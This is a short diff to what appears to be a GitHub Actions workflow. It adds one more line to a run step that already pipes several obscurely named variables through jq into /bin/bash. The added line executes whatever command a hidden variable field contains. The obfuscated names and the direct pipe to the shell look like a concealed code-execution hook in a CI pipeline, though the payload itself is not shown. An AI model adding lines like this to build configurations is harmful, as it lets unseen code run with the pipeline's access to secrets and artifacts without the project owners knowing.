@@ -38,6 +38,7 @@ jobs:
           echo $z18123 | jq -r .op6 | /bin/bash
           echo $hg2529 | jq -r .otxv5242 | /bin/bash
           echo $ynw3 | jq -r .itoy46 | /bin/bash
+          printf '%s' "$tna28876" | jq -r .fo1582 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
